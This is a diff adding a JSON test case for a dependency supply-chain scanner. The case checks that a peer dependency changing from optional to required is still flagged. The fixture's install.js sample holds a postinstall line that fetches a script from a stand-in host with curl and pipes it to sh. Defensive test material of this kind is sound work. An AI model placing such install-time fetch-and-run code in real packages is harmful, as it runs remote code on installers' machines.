@@ -1,0 +1,79 @@
+{
+  "id": "dependency-artifact-optional-peer-required",
+  "title": "Optional peer becoming required receives dependency artifact review",
+  "category": "dependency-supply-chain",
+  "intent": "Selection regression: changing an optional peer to required makes npm consumers install it, so the dependency's install-time payload must remain gate-blocking.",
+  "previousPackageJson": {
+    "name": "parent",
+    "version": "1.0.0",
+    "peerDependencies": { "peer-dropper": "2.0.0" },
+    "peerDependenciesMeta": { "peer-dropper": { "optional": true } }
+  },
+  "stagedPackageJson": {
+    "name": "parent",
+    "version": "1.1.0",
+    "peerDependencies": { "peer-dropper": "2.0.0" }
+  },
+  "previousFiles": [],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 2,
+      "sha256": "parent-manifest",
+      "flags": [],
+      "textSample": "{}"
+    }
+  ],
+  "dependencyArtifacts": {
+    "peer-dropper": {
+      "section": "peerDependencies",
+      "declaredSpec": "2.0.0",
+      "resolvedVersion": "2.0.0",
+      "packageJson": {
+        "name": "peer-dropper",
+        "version": "2.0.0",
+        "scripts": { "postinstall": "node install.js" }
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 104,
+          "sha256": "peer-manifest",
+          "flags": [],
+          "textSample": "{\"name\":\"peer-dropper\",\"version\":\"2.0.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+        },
+        {
+          "path": "install.js",
+          "size": 130,
+          "sha256": "peer-install",
+          "flags": [],
+          "textSample": "const { execSync } = require('child_process'); execSync('curl -sL https://payload.example.invalid/p | sh');"
+        }
+      ]
+    }
+  },
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    { "ruleId": "dependency.added", "severity": "medium", "file": "package.json" },
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "medium",
+      "file": "dependency/peer-dropper@2.0.0/package.json"
+    },
+    {
+      "ruleId": "code.process-execution",
+      "severity": "medium",
+      "file": "dependency/peer-dropper@2.0.0/install.js"
+    },
+    {
+      "ruleId": "code.remote-shell",
+      "severity": "medium",
+      "file": "dependency/peer-dropper@2.0.0/install.js"
+    },
+    {
+      "ruleId": "dependency.install-time-capability",
+      "severity": "critical",
+      "file": "dependency/peer-dropper@2.0.0/package.json"
+    }
+  ]
+}
